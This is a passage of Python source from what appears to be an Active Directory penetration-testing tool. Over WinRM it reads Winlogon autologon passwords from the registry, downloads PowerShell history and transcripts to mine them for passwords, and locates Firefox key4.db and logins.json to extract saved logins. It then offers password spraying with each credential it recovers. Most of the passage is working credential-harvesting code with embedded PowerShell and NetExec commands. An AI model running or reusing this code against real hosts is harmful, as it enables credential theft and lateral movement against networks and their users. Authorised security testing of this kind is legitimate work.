    auth = shell.build_auth_nxc(username, password, domain, kerberos=False)

    autologon_command = (
        f"""{shell.netexec_path} winrm {host} {auth} --log domains/{domain}/winrm/dump_{host}_autologon.txt """
        f"""-X 'Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" | """
        f"""Select DefaultDomainName,DefaultUserName,DefaultPassword | fl'"""
    )
    print_info_debug(f"Command: {autologon_command}")
    completed_process = shell._run_netexec(  # type: ignore[attr-defined]
        autologon_command,
        domain=domain,
        timeout=300,
        operation_kind="winrm_autologon_fallback",
        service="winrm",
        target_count=1,
    )
    output = completed_process.stdout or ""
    errors_output = completed_process.stderr or ""

    if completed_process.returncode != 0:
        error_message = errors_output.strip() if errors_output else output.strip()
        raise WinRMPSRPError(
            "Error obtaining autologon credentials: "
            f"{error_message if error_message else 'Details not available'}"
        )

    default_user_name = ""
    default_password = ""
    default_domain_name = ""

    for line in output.splitlines():
        if "DefaultUserName" in line:
            parts = line.split(":", 1)
            if len(parts) > 1:
                default_user_name = parts[1].strip()
        elif "DefaultPassword" in line:
            parts = line.split(":", 1)
            if len(parts) > 1:
                default_password = parts[1].strip()
        elif "DefaultDomainName" in line:
            parts = line.split(":", 1)
            if len(parts) > 1:
                default_domain_name = parts[1].strip()

    return default_user_name, default_password, default_domain_name


def show_powershell_history(
    shell: Any, *, domain: str, host: str, username: str, password: str
) -> None:
    """Retrieve and process PowerShell history for a specific user via WinRM."""
    if _should_skip_winrm_followup_for_ctf_pwned(
        shell=shell,
        domain=domain,
        action_label="powershell_history",
    ):
        return
    try:
        history_remote_path = (
            f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\"
            "PowerShell\\PSReadLine\\ConsoleHost_history.txt"
        )

        marked_username = mark_sensitive(username, "user")
        print_info(f"Checking PowerShell history for user {marked_username}")

        download_dir = os.path.join(
            shell.domains_dir, domain, "winrm", host, "powershell_history"
        )
        downloaded_files = shell.winrm_download(
            domain,
            host,
            username,
            password,
            [history_remote_path],
            download_dir,
        )

        if not downloaded_files:
            marked_username = mark_sensitive(username, "user")
            marked_host = mark_sensitive(host, "hostname")
            print_warning(
                f"No PowerShell history file found for user {marked_username} on host {marked_host}."
            )
            return

        history_local_path = downloaded_files[0]

        try:
            with open(
                history_local_path, "r", encoding="utf-8", errors="ignore"
            ) as handle:
                history_lines = [
                    line.rstrip("\r\n") for line in handle if line.strip()
                ]
        except OSError as file_err:
            telemetry.capture_exception(file_err)
            print_error(
                f"Error reading downloaded PowerShell history file: {file_err}"
            )
            return

        if not history_lines:
            marked_username = mark_sensitive(username, "user")
            marked_host = mark_sensitive(host, "hostname")
            print_warning(
                f"PowerShell history file for user {marked_username} on host {marked_host} is empty."
            )
        else:
            import rich
            from rich.table import Table

            marked_username = mark_sensitive(username, "user")
            marked_host = mark_sensitive(host, "hostname")
            print_success(
                f"PowerShell history retrieved for user {marked_username} on host {marked_host}."
            )
            history_table = Table(
                title="PowerShell Command History",
                show_header=True,
                header_style="bold magenta",
                box=rich.box.ROUNDED,
                expand=False,
            )
            history_table.add_column("Command", style="white", overflow="fold")

            for cmd in history_lines:
                history_table.add_row(cmd)

            shell.console.print(history_table)

        credentials = shell.analyze_log_with_credsweeper(history_local_path)

        if not credentials:
            render_no_extracted_findings_preview(
                loot_dir=os.path.dirname(history_local_path),
                loot_rel=os.path.relpath(
                    os.path.dirname(history_local_path),
                    shell._get_workspace_cwd(),
                ),
                analyzed_count=1,
                category="credential",
                phase_label="PowerShell history review",
                candidate_paths=[os.path.basename(history_local_path)],
                report_root_abs=os.path.dirname(history_local_path),
                scope_label="WinRM PowerShell history",
                preview_limit=5,
            )
            return

        seen_passwords: set[str] = set()
        found_count = 0

        for _, entries in credentials.items():
            for value, ml_probability, context_line, line_num, file_path in entries:
                if not value:
                    continue
                password_value = value.strip()
                if not password_value or password_value in seen_passwords:
                    continue
                seen_passwords.add(password_value)
                found_count += 1

                confidence_display = (
                    f"{float(ml_probability):.2%}"
                    if isinstance(ml_probability, (int, float))
                    else "N/A"
                )
                marked_username = mark_sensitive(username, "user")
                marked_domain = mark_sensitive(domain, "domain")
                marked_host = mark_sensitive(host, "hostname")
                marked_file_path = mark_sensitive(file_path, "path")
                marked_password = mark_sensitive(password_value, "password")
                marked_suffix = mark_sensitive(
                    "..." if len(password_value) > 50 else "", "password"
                )
                print_info(
                    f"[PSHistory] Potential password for {marked_username}@{marked_domain} "
                    f"on {marked_host}: '{marked_password[:50]}{marked_suffix}' "
                    f"(confidence: {confidence_display}, line: {line_num}, file: {marked_file_path})"
                )

                if _should_skip_winrm_followup_for_ctf_pwned(
                    shell=shell,
                    domain=domain,
                    action_label="powershell_history_spraying_prompt",
                ):
                    return
                answer = Confirm.ask(
                    "Would you like to perform a password spraying with this password?",
                    default=True,
                )
                if answer:
                    shell.spraying_with_password(domain, password_value)

        if found_count > 0:
            marked_username = mark_sensitive(username, "user")
            print_success(
                f"Added {found_count} potential credential(s) from PowerShell history for user {marked_username}."
            )
        else:
            render_no_extracted_findings_preview(
                loot_dir=os.path.dirname(history_local_path),
                loot_rel=os.path.relpath(
                    os.path.dirname(history_local_path),
                    shell._get_workspace_cwd(),
                ),
                analyzed_count=1,
                category="credential",
                phase_label="PowerShell history review",
                candidate_paths=[os.path.basename(history_local_path)],
                report_root_abs=os.path.dirname(history_local_path),
                scope_label="WinRM PowerShell history",
                preview_limit=5,
            )

    except Exception as exc:  # pragma: no cover - defensive
        telemetry.capture_exception(exc)
        print_error("Error accessing PowerShell history.")
        print_exception(show_locals=False, exception=exc)


def check_powershell_transcripts(
    shell: Any, *, domain: str, host: str, username: str, password: str
) -> None:
    """Check and analyze PowerShell transcripts on a host via PSRP."""
    from adscan_internal.rich_output import mark_sensitive

    if _should_skip_winrm_followup_for_ctf_pwned(
        shell=shell,
        domain=domain,
        action_label="powershell_transcripts",
    ):
        return
    try:
        cred_type = "Hash" if shell.is_hash(password) else "Password"

        print_operation_header(
            "PowerShell Transcript Analysis",
            details={
                "Domain": domain,
                "Target Host": host,
                "Username": username,
                "Credential Type": cred_type,
                "Protocol": "WinRM",
                "Search Path": "Common transcript directories + C:\\pstrans*",
                "Target Files": "PowerShell_transcript*",
            },
            icon="📝",
        )

        search_script = (
            '$ErrorActionPreference="SilentlyContinue";'
            "$candidatePaths=@("
            '"C:\\\\PSTranscripts",'
            '"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\PowerShell\\\\Transcripts",'
            '"C\\\\ProgramData\\\\PowerShell\\\\Transcripts",'
            '"C:\\\\Users\\\\*\\\\Documents\\\\PowerShell\\\\Transcripts",'
            '"C:\\\\Users\\\\*\\\\Documents\\\\WindowsPowerShell\\\\Transcripts",'
            '"C:\\\\Users\\\\*\\\\Documents"'
            ");"
            "$paths=@();"
            "foreach($p in $candidatePaths){ if(Test-Path $p){ $paths+=$p } };"
            "$rootMatches=@();"
            'try { $rootMatches = Get-ChildItem -Path "C:\\" -Directory -Force -Filter "pstrans*" '
            "-ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName } catch { };"
            "if($rootMatches.Count -gt 0){ $paths += $rootMatches };"
            "if($paths.Count -eq 0){ @() | ConvertTo-Json -Compress; exit 0 };"
            '$results = Get-ChildItem -Path $paths -Filter "PowerShell_transcript*" '
            "-Recurse -Force -ErrorAction SilentlyContinue | "
            "ForEach-Object { $_.FullName }; "
            "$results | ConvertTo-Json -Compress"
        )
        try:
            search_output = _execute_powershell_via_psrp(
                domain=domain,
                host=host,
                username=username,
                password=password,
                script=search_script,
                operation_name="powershell_transcript_search",
            )
            transcript_paths = _parse_psrp_path_list(search_output)
        except (WinRMPSRPError, json.JSONDecodeError) as exc:
            print_info_debug(
                "WinRM PSRP transcript search failed; falling back to NetExec: "
                f"{exc}"
            )
            transcript_paths = _search_powershell_transcripts_legacy_netexec(
                shell,
                domain=domain,
                host=host,
                username=username,
                password=password,
            )

        if not transcript_paths:
            marked_host = mark_sensitive(host, "hostname")
            print_warning(
                f"No PowerShell transcript files found for host {marked_host} "
                "when searching common transcript directories."
            )
            return

        marked_host = mark_sensitive(host, "hostname")
        print_success(
            f"Found {len(transcript_paths)} PowerShell transcript file(s) on host {marked_host}."
        )
        if getattr(shell, "SECRET_MODE", False):
            print_info_debug(
                f"[PSTranscripts] Remote transcript paths: {transcript_paths}"
            )

        transcripts_download_dir = os.path.join(
            shell.domains_dir, domain, "winrm", host, "pstranscripts"
        )
        downloaded_files = shell.winrm_download(
            domain,
            host,
            username,
            password,
            transcript_paths,
            transcripts_download_dir,
        )

        if not downloaded_files:
            marked_host = mark_sensitive(host, "hostname")
            print_warning(
                f"Failed to download PowerShell transcript files from host {marked_host}."
            )
            return

        print_success(
            f"Downloaded {len(downloaded_files)} PowerShell transcript file(s) "
            f"to {transcripts_download_dir}"
        )

        total_found = 0
        seen_passwords: set[str] = set()

        for local_path in downloaded_files:
            credentials = shell.analyze_log_with_credsweeper(local_path)
            if not credentials:
                continue

            for _, entries in credentials.items():
                for (
                    value,
                    ml_probability,
                    context_line,
                    line_num,
                    file_path,
                ) in entries:
                    if not value:
                        continue
                    password_value = value.strip()
                    if not password_value or password_value in seen_passwords:
                        continue
                    seen_passwords.add(password_value)
                    total_found += 1

                    confidence_display = (
                        f"{float(ml_probability):.2%}"
                        if isinstance(ml_probability, (int, float))
                        else "N/A"
                    )
                    marked_username = mark_sensitive(username, "user")
                    marked_domain = mark_sensitive(domain, "domain")
                    marked_host = mark_sensitive(host, "hostname")
                    marked_file_path = mark_sensitive(file_path, "path")
                    marked_password = mark_sensitive(password_value, "password")
                    marked_suffix = mark_sensitive(
                        "..." if len(password_value) > 50 else "", "password"
                    )
                    print_info(
                        f"[PSTranscripts] Potential password for {marked_username}@{marked_domain} "
                        f"on {marked_host}: '{marked_password[:50]}{marked_suffix}' "
                        f"(confidence: {confidence_display}, line: {line_num}, file: {marked_file_path})"
                    )

                    if _should_skip_winrm_followup_for_ctf_pwned(
                        shell=shell,
                        domain=domain,
                        action_label="powershell_transcripts_spraying_prompt",
                    ):
                        return
                    answer = Confirm.ask(
                        "Would you like to perform a password spraying with this password?",
                        default=True,
                    )
                    if answer:
                        shell.spraying_with_password(domain, password_value)

        if total_found > 0:
            marked_username = mark_sensitive(username, "user")
            marked_host = mark_sensitive(host, "hostname")
            print_success(
                f"Added {total_found} potential credential(s) from PowerShell transcripts "
                f"for user {marked_username} on host {marked_host}."
            )
        else:
            render_no_extracted_findings_preview(
                loot_dir=transcripts_download_dir,
                loot_rel=os.path.relpath(
                    transcripts_download_dir,
                    shell._get_workspace_cwd(),
                ),
                analyzed_count=len(downloaded_files),
                category="credential",
                phase_label="PowerShell transcript review",
                candidate_paths=[
                    os.path.relpath(path, transcripts_download_dir)
                    for path in downloaded_files
                    if str(path).strip()
                ],
                report_root_abs=transcripts_download_dir,
                scope_label="WinRM PowerShell transcripts",
                preview_limit=5,
            )

    except Exception as exc:  # pragma: no cover - defensive
        telemetry.capture_exception(exc)
        marked_host = mark_sensitive(host, "hostname")
        print_error(
            f"Error checking or analyzing PowerShell transcripts on host {marked_host}: {str(exc)}"
        )


def _search_powershell_transcripts_legacy_netexec(
    shell: Any, *, domain: str, host: str, username: str, password: str
) -> list[str]:
    """Fallback transcript discovery via NetExec ``-X``."""
    auth = shell.build_auth_nxc(username, password, domain, kerberos=False)
    transcript_search_log = os.path.join(
        "domains", domain, "winrm", f"{host}_pstranscripts_search.log"
    )
    search_script = (
        '$ErrorActionPreference="SilentlyContinue";'
        "$candidatePaths=@("
        '"C:\\\\PSTranscripts",'
        '"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\PowerShell\\\\Transcripts",'
        '"C\\\\ProgramData\\\\PowerShell\\\\Transcripts",'
        '"C:\\\\Users\\\\*\\\\Documents\\\\PowerShell\\\\Transcripts",'
        '"C:\\\\Users\\\\*\\\\Documents\\\\WindowsPowerShell\\\\Transcripts",'
        '"C:\\\\Users\\\\*\\\\Documents"'
        ");"
        "$paths=@();"
        "foreach($p in $candidatePaths){ if(Test-Path $p){ $paths+=$p } };"
        "$rootMatches=@();"
        'try { $rootMatches = Get-ChildItem -Path "C:\\" -Directory -Force -Filter "pstrans*" '
        "-ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName } catch { };"
        "if($rootMatches.Count -gt 0){ $paths += $rootMatches };"
        "if($paths.Count -eq 0){ exit 0 };"
        'Get-ChildItem -Path $paths -Filter "PowerShell_transcript*" '
        "-Recurse -Force -ErrorAction SilentlyContinue | "
        "ForEach-Object { $_.FullName }"
    )
    search_command = (
        f"""{shell.netexec_path} winrm {host} {auth} """
        f"""--log {transcript_search_log} -X '{search_script}'"""
    )
    print_info_debug(f"Command: {search_command}")
    search_proc = shell.run_command(search_command, timeout=300)
    search_output = strip_ansi_codes(search_proc.stdout or "")

    if search_proc.returncode != 0:
        error_message = strip_ansi_codes(
            (search_proc.stderr or search_output or "").strip()
        )
        marked_host = mark_sensitive(host, "hostname")
        raise WinRMPSRPError(
            f"Error searching for PowerShell transcripts on host {marked_host}: "
            f"{error_message or 'Details not available'}"
        )

    transcript_paths: list[str] = []
    for line in search_output.splitlines():
        match = re.search(r"[A-Za-z]:\\[^\r\n]+", line)
        if match:
            transcript_paths.append(match.group(0).strip())
    return transcript_paths


def winrm_download(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    paths: Iterable[str],
    download_dir: str,
) -> list[str]:
    """Download files from a target host using PSRP with NetExec fallback.

    Args:
        shell: Active `PentestShell` instance.
        domain: User's domain.
        host: Target host.
        username: WinRM-accessible username.
        password: Password or NTLM hash.
        paths: File paths to download.
        download_dir: Local directory to save files into.

    Returns:
        List of successfully downloaded local file paths.
    """
    try:
        os.makedirs(download_dir, exist_ok=True)
        service = build_winrm_reusable_backend(
            domain=domain,
            host=host,
            username=username,
            password=password,
        )
        try:
            downloaded_files = service.fetch_files(paths, download_dir)
            for file_path in downloaded_files:
                marked_path = mark_sensitive(file_path, "path")
                print_success(f"File saved in {marked_path}")
            return downloaded_files
        except WinRMPSRPError as exc:
            print_info_debug(
                f"WinRM PSRP download failed; falling back to NetExec: {exc}"
            )
            return _winrm_download_legacy_netexec(
                shell,
                domain=domain,
                host=host,
                username=username,
                password=password,
                paths=paths,
                download_dir=download_dir,
            )
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_error("Error downloading files.")
        print_exception(show_locals=False, exception=exc)
        return []


def _winrm_download_legacy_netexec(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    paths: Iterable[str],
    download_dir: str,
) -> list[str]:
    """Fallback file download via NetExec ``-X`` and base64 transfer."""
    auth = shell.build_auth_nxc(username, password, domain, kerberos=False)
    downloaded_files: list[str] = []

    for path in paths:
        file_name = path.split("\\")[-1]
        save_path = os.path.join(download_dir, file_name)

        download_command = (
            f"{shell.netexec_path} winrm {host} {auth} "
            f"--log {download_dir}/download_{file_name}.log "
            f'-X \'$content = Get-Content "{path}" -Raw -Encoding Byte; '
            "[Convert]::ToBase64String($content)'"
        )

        print_info_verbose(f"Downloading {file_name}")
        print_info_debug(f"via: {download_command}")
        proc = shell.run_command(download_command, timeout=300)

        if proc.returncode != 0:
            details = proc.stderr.strip() if proc.stderr else "Details not available"
            print_error(f"Error downloading {file_name}: {details}")
            continue

        try:
            base64_match = re.search(r"([A-Za-z0-9+/]{40,}={0,2})", proc.stdout)
            if not base64_match:
                print_warning_verbose(
                    f"No valid base64 content found for {file_name}"
                )
                continue

            cleaned_output = base64_match.group(1)
            while len(cleaned_output) % 4 != 0:
                cleaned_output += "="

            file_content = base64.b64decode(cleaned_output)
            with open(save_path, "wb") as handle:
                handle.write(file_content)
            print_success(f"File {file_name} saved in {download_dir}")
            downloaded_files.append(save_path)
        except Exception as exc:
            telemetry.capture_exception(exc)
            print_error(f"Error saving {file_name}.")
            print_exception(show_locals=False, exception=exc)

    return downloaded_files


def winrm_upload(
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    local_path: str,
    remote_path: str,
) -> bool:
    """Upload a local file to a remote host over WinRM using pypsrp.

    This implementation is inspired by evil-winrm-py's chunked uploader.
    """
    marked_host = mark_sensitive(host, "hostname")
    print_info_verbose(
        f"Uploading '{local_path}' to '{remote_path}' on {marked_host} via WinRM/pypsrp."
    )

    try:
        service = build_winrm_reusable_backend(
            domain=domain,
            host=host,
            username=username,
            password=password,
        )
        result = service.upload_file(local_path, remote_path)
    except WinRMPSRPError as exc:
        telemetry.capture_exception(exc)
        print_error(f"WinRM upload failed: {exc}")
        return False
    if result:
        marked_remote = mark_sensitive(remote_path, "path")
        print_success(f"WinRM upload completed: {marked_remote}")
        return True
    print_warning(
        "WinRM upload finished but remote verification metadata is missing."
    )
    return True


def check_firefox_credentials(
    shell: Any, *, domain: str, host: str, username: str, password: str
) -> None:
    """Search for Firefox credential files on a host using PSRP with fallback.

    This helper mirrors the legacy ``PentestShell.do_check_firefox_credentials``
    method in ``adscan.py`` so it can be reused by other UX layers.
    """
    if _should_skip_winrm_followup_for_ctf_pwned(
        shell=shell,
        domain=domain,
        action_label="firefox_credentials",
    ):
        return
    try:
        from adscan_internal.workspaces import DEFAULT_DOMAIN_LAYOUT, domain_subpath

        cred_type = "Hash" if shell.is_hash(password) else "Password"

        print_operation_header(
            "Firefox Credential Search",
            details={
                "Domain": domain,
                "Target Host": host,
                "Username": username,
                "Credential Type": cred_type,
                "Protocol": "WinRM",
                "Search Path": f"C:\\Users\\{username}\\AppData",
                "Target Files": "key4.db, logins.json",
            },
            icon="🦊",
        )

        search_script = (
            f'$results = Get-ChildItem -Path "C:\\Users\\{username}\\AppData" '
            "-Include key4.db,logins.json -File -Recurse -ErrorAction SilentlyContinue | "
            "ForEach-Object { $_.FullName }; "
            "$results | ConvertTo-Json -Compress"
        )

        try:
            output = _execute_powershell_via_psrp(
                domain=domain,
                host=host,
                username=username,
                password=password,
                script=search_script,
                operation_name="firefox_credentials_search",
            )
            paths = _parse_psrp_path_list(output)
        except (WinRMPSRPError, json.JSONDecodeError) as exc:
            print_info_debug(
                "WinRM PSRP Firefox search failed; falling back to NetExec: "
                f"{exc}"
            )
            paths = _check_firefox_credentials_legacy_netexec(
                shell,
                domain=domain,
                host=host,
                username=username,
                password=password,
            )

        if any(path.endswith("key4.db") for path in paths) and any(
            path.endswith("logins.json") for path in paths
        ):
            marked_username = mark_sensitive(username, "user")
            print_warning(
                f"Firefox credential files found for user {marked_username}"
            )

            if not paths:
                print_error("No valid file paths found")
                return

            workspace_cwd = shell.current_workspace_dir or os.getcwd()
            download_dir = domain_subpath(
                workspace_cwd,
                shell.domains_dir,
                domain,
                DEFAULT_DOMAIN_LAYOUT.winrm,
                host,
            )
            downloaded_files = shell.winrm_download(
                domain, host, username, password, paths, download_dir
            )

            if downloaded_files:
                shell.extract_firefox_passwords(domain, host, download_dir)
        else:
            marked_username = mark_sensitive(username, "user")
            print_error(
                f"No Firefox credential files found for user {marked_username}"
            )

    except Exception as exc:  # pragma: no cover - defensive
        telemetry.capture_exception(exc)
        print_error("Error searching for Firefox credentials.")
        print_exception(show_locals=False, exception=exc)


def _check_firefox_credentials_legacy_netexec(
    shell: Any, *, domain: str, host: str, username: str, password: str
) -> list[str]:
    """Fallback Firefox credential file discovery via NetExec."""
    auth = shell.build_auth_nxc(username, password, domain, kerberos=False)
    firefox_command = (
        f"""{shell.netexec_path} winrm {host} {auth} --log """
        f"""domains/{domain}/winrm/{host}_firefox_{username}.log -X """
        f"""'Get-ChildItem -Path "C:\\Users\\{username}\\AppData" """
        f"""-Include key4.db,logins.json -File -Recurse -ErrorAction SilentlyContinue """
        f"""| ForEach-Object {{ $_.FullName }}'"""
    )
    print_info_debug(f"Command: {firefox_command}")
    completed_process = shell.run_command(firefox_command, timeout=300)
    output = completed_process.stdout or ""

    if completed_process.returncode != 0:
        error_message = (completed_process.stderr or output or "").strip()
        raise WinRMPSRPError(
            "Error finding Firefox files: "
            f"{error_message if error_message else 'Details not available'}"
        )

    paths: list[str] = []
    for line in output.splitlines():
        match = re.search(r"[A-Za-z]:\\[^\r\n]+", line)
        if match:
            paths.append(match.group(0).strip())
    return paths


def _count_grouped_credential_findings(
    findings: dict[str, list[tuple[str, float | None, str, int, str]]],
) -> tuple[int, int]:
    """Return total findings and number of files with at least one finding."""
    total = 0
    files: set[str] = set()
    for entries in findings.values():
        total += len(entries)
        for _, _, _, _, file_path in entries:
            if file_path:
                files.add(file_path)
    return total, len(files)


def _list_files_under_path(root_path: str) -> list[str]:
    """Return all regular files under one local root."""
    collected: list[str] = []
    for current_root, _, files in os.walk(root_path):
        for filename in files:
            collected.append(os.path.join(current_root, filename))
    return collected


def _is_ctf_domain_pwned(shell: Any, domain: str) -> bool:
    """Return True when a CTF domain is already marked as pwned."""
    checker = getattr(shell, "_is_ctf_domain_pwned", None)
    if callable(checker):
        try:
            if bool(checker(domain)):
                return True
        except Exception:  # pragma: no cover - defensive
            return False
    if str(getattr(shell, "type", "")).strip().lower() != "ctf":
        return False
    domains_data = getattr(shell, "domains_data", {}) or {}
    domain_data = domains_data.get(domain, {}) if isinstance(domains_data, dict) else {}
    return str(domain_data.get("auth", "")).strip().lower() == "pwned"


def _should_skip_winrm_followup_for_ctf_pwned(
    *,
    shell: Any,
    domain: str,
    action_label: str,
) -> bool:
    """Return True when a WinRM follow-up should be skipped in CTF after pwning."""
    if not _is_ctf_domain_pwned(shell, domain):
        return False
    print_info_debug(
        "Skipping WinRM follow-up because the CTF domain is already pwned: "
        f"domain={mark_sensitive(domain, 'domain')} "
        f"action={mark_sensitive(action_label, 'text')}"
    )
    return True


def _should_continue_with_deeper_winrm_sensitive_scan(
    *,
    shell: Any,
    domain: str,
    phase_result: dict[str, Any],
) -> bool:
    """Ask whether deeper deterministic WinRM analysis should continue."""
    if _is_ctf_domain_pwned(shell, domain):
        print_info_debug(
            "Skipping deeper deterministic WinRM prompt because the CTF domain "
            f"is already pwned: domain={mark_sensitive(domain, 'domain')}"
        )
        return False
    credential_findings = int(phase_result.get("credential_findings", 0) or 0)
    files_with_findings = int(phase_result.get("files_with_findings", 0) or 0)
    if credential_findings > 0 or files_with_findings > 0:
        prompt = (
            "WinRM text-file credential findings were identified. Continue with "
            "deeper analysis for additional artifacts and document-based secrets?"
        )
    else:
        prompt = (
            "No credential-like findings were identified in WinRM text files. "
            "Continue with deeper analysis on high-value artifacts and document "
            "formats? This will take longer."
        )
    confirmer = getattr(shell, "_questionary_confirm", None)
    if callable(confirmer):
        return bool(confirmer(prompt, default=True))
    return Confirm.ask(prompt, default=True)


def _should_continue_with_heavy_winrm_artifact_analysis(
    *,
    shell: Any,
    domain: str,
) -> bool:
    """Ask whether the heaviest WinRM artifact phase should run."""
    if _is_ctf_domain_pwned(shell, domain):
        print_info_debug(
            "Skipping heavy-artifact deterministic WinRM prompt because the CTF "
            f"domain is already pwned: domain={mark_sensitive(domain, 'domain')}"
        )
        return False
    prompt = (
        "Do you want to continue with heavy WinRM artifact analysis "
        "(ZIP/DMP/PCAP/VDI)? This is slower and more resource-intensive."
    )
    confirmer = getattr(shell, "_questionary_confirm", None)
    if callable(confirmer):
        return bool(confirmer(prompt, default=True))
    return Confirm.ask(prompt, default=True)


def _select_winrm_sensitive_data_method(shell: Any, *, ai_configured: bool) -> str:
    """Select one sensitive-data analysis mode for WinRM workflows."""
    selector = getattr(shell, "_questionary_select", None)
    if not ai_configured:
        options = [
            "Deterministic file analysis",
            "Skip sensitive-data analysis",
        ]
        if callable(selector):
            idx = selector("Select WinRM sensitive-data analysis mode:", options, default_idx=0)
            return "skip" if int(idx or 0) == 1 else "deterministic"
        return "deterministic"

    options = [
        "Deterministic file analysis",
        "AI-assisted file analysis",
        "Skip sensitive-data analysis",
    ]
    if callable(selector):
        idx = int(selector("Select WinRM sensitive-data analysis mode:", options, default_idx=0) or 0)
        if idx == 1:
            return "ai"
        if idx == 2:
            return "skip"
        return "deterministic"
    return "deterministic"


def _build_winrm_mapping_cache_metadata(
    *,
    host: str,
    domain: str,
    username: str,
    workspace_type: str,
    root_strategy: str,
    excluded_path_prefixes: list[str],
    excluded_directory_names: list[str],
) -> dict[str, object]:
    """Build the stable metadata used to validate a cached WinRM manifest."""
    return {
        "backend": "psrp",
        "host": host,
        "domain": domain,
        "username": username,
        "workspace_type": workspace_type,
        "root_strategy": root_strategy,
        "excluded_path_prefixes": list(excluded_path_prefixes),
        "excluded_directory_names": list(excluded_directory_names),
    }


def _get_winrm_mapping_cache_paths(
    shell: Any,
    *,
    workspace_cwd: str,
    domain: str,
    host: str,
    username: str,
    root_strategy: str,
) -> tuple[str, str]:
    """Return absolute/relative cache manifest paths for one WinRM mapping context."""
    from adscan_internal.workspaces import DEFAULT_DOMAIN_LAYOUT, domain_relpath, domain_subpath

    cache_key = WinRMFileMappingService.build_cache_key(
        host=host,
        username=username,
        root_strategy=root_strategy,
    )
    cache_abs = domain_subpath(
        workspace_cwd,
        shell.domains_dir,
        domain,
        DEFAULT_DOMAIN_LAYOUT.winrm,
        "sensitive",
        "cache",
        cache_key,
        "mapping",
        "file_tree_map.json",
    )
    cache_rel = domain_relpath(
        shell.domains_dir,
        domain,
        DEFAULT_DOMAIN_LAYOUT.winrm,
        "sensitive",
        "cache",
        cache_key,
        "mapping",
        "file_tree_map.json",
    )
    return cache_abs, cache_rel


def _parse_iso8601_timestamp(value: str) -> datetime | None:
    """Parse one ISO 8601 timestamp and return a timezone-aware UTC datetime."""
    normalized = str(value or "").strip()
    if not normalized:
        return None
    try:
        parsed = datetime.fromisoformat(normalized)
    except ValueError:
        return None
    if parsed.tzinfo is None:
        return parsed.replace(tzinfo=timezone.utc)
    return parsed.astimezone(timezone.utc)


def _resolve_winrm_mapping_cache_age_seconds(generated_at: str) -> float | None:
    """Return the cache age in seconds for one persisted WinRM manifest."""
    parsed = _parse_iso8601_timestamp(generated_at)
    if parsed is None:
        return None
    return max(0.0, (datetime.now(timezone.utc) - parsed).total_seconds())


def _resolve_winrm_mapping_mode(shell: Any) -> str:
    """Resolve the WinRM mapping cache policy override for one workflow run."""
    shell_override = str(getattr(shell, "winrm_mapping_cache_mode", "") or "").strip().lower()
    if shell_override in _VALID_WINRM_MAPPING_MODES:
        return shell_override
    env_override = str(os.environ.get("ADSCAN_WINRM_MAPPING_MODE", "") or "").strip().lower()
    if env_override in _VALID_WINRM_MAPPING_MODES:
        return env_override
    return _WINRM_MAPPING_MODE_AUTO


def _is_winrm_mapping_cache_compatible(
    *,
    cache_payload: dict[str, object],
    expected_metadata: dict[str, object],
) -> tuple[bool, str]:
    """Validate whether one cached WinRM manifest can be safely reused."""
    schema_version = int(cache_payload.get("schema_version") or 0)
    if schema_version != WinRMFileMappingService.SCHEMA_VERSION:
        return False, "schema version mismatch"
    cached_metadata = dict(cache_payload.get("metadata") or {})
    if cached_metadata != expected_metadata:
        return False, "mapping context mismatch"
    entries = list(cache_payload.get("entries") or [])
    if not entries:
        return False, "cached mapping has no entries"
    return True, "compatible"


def _render_winrm_artifact_processing_summary(
    shell: Any,
    *,
    phase_label: str,
    records: list[ArtifactProcessingRecord],
    report_path: str,
) -> None:
    """Render one shared artifact summary for WinRM artifact phases."""
    render_artifact_processing_summary(
        shell,
        phase_label=phase_label,
        records=records,
        report_path=report_path,
    )


def _persist_winrm_artifact_processing_report(
    *,
    phase_root_abs: str,
    records: list[ArtifactProcessingRecord],
) -> str:
    """Persist one shared artifact report for WinRM phases."""
    return persist_artifact_processing_report(
        phase_root_abs=phase_root_abs,
        records=records,
    )


def _classify_winrm_fetch_skip_reason(reason: str) -> str:
    """Collapse raw WinRM fetch failures into stable troubleshooting buckets."""
    normalized = str(reason or "").strip().casefold()
    if "being used by another process" in normalized or "used by another process" in normalized:
        return "file_in_use"
    if "access to the path" in normalized and "denied" in normalized:
        return "access_denied"
    if "access is denied" in normalized or "permission denied" in normalized:
        return "access_denied"
    return "other"


def _summarize_winrm_fetch_skip_reasons(
    skipped_files: list[tuple[str, str]],
) -> dict[str, int]:
    """Count skipped WinRM fetch files by reason category."""
    summary = {
        "access_denied": 0,
        "file_in_use": 0,
        "other": 0,
    }
    for _path, reason in skipped_files:
        summary[_classify_winrm_fetch_skip_reason(reason)] += 1
    return summary


def _persist_winrm_phase_fetch_report(
    *,
    phase_root_abs: str,
    fetch_result: WinRMPhaseFetchResult,
) -> str:
    """Persist WinRM fetch metadata for later troubleshooting."""
    report_path = os.path.join(phase_root_abs, "fetch_report.json")
    skipped_files = list(fetch_result.skipped_files or [])
    per_file_failures = list(fetch_result.per_file_failures or [])
    payload = {
        "batch_used": fetch_result.batch_used,
        "batch_fallback": fetch_result.batch_fallback,
        "staged_file_count": int(fetch_result.staged_file_count or 0),
        "downloaded_file_count": len(fetch_result.downloaded_files),
        "auth_invalid_abort": fetch_result.auth_invalid_abort,
        "auth_invalid_reason": fetch_result.auth_invalid_reason,
        "skipped_files": [
            {"remote_path": path, "reason": reason}
            for path, reason in skipped_files
        ],
        "skipped_summary": _summarize_winrm_fetch_skip_reasons(skipped_files),
        "per_file_failures": [
            {"remote_path": path, "reason": reason}
            for path, reason in per_file_failures
        ],
    }
    with open(report_path, "w", encoding="utf-8") as handle:
        json.dump(payload, handle, indent=2, ensure_ascii=True)
    return report_path


def _run_winrm_sensitive_scan_phase(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    phase: str,
    entries: list[WinRMFileMapEntry],
    run_root_abs: str,
) -> dict[str, Any]:
    """Run one deterministic WinRM sensitive-data phase from a mapped manifest."""

    phase_definition = get_sensitive_phase_definition(phase)
    phase_label = str(phase_definition.get("label", phase) or phase)
